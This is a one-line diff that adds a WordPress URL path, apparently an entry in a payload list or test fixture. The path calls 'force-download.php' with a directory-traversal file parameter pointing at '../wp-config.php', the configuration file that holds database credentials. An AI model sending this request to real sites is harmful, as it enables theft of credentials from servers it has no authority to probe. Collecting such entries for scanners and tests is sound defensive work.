@@ -1,0 +1,1 @@
+/wp-content/force-download.php?file=../wp-config.php
